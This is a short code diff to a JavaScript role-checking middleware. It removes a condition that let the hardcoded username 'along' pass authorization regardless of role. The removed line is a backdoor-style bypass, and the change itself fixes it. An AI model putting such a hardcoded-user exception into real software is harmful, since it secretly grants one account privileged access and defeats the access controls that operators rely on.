@@ -20,8 +20,7 @@ const checkRole = (allowedRoles) => {
         role === "Quản lý" || 
         role === "Admin" || 
         role === "Quản trị viên" || 
-        user.permission === 1 ||
-        user.username === "along"
+        user.permission === 1
       ) {
         return next();
       }
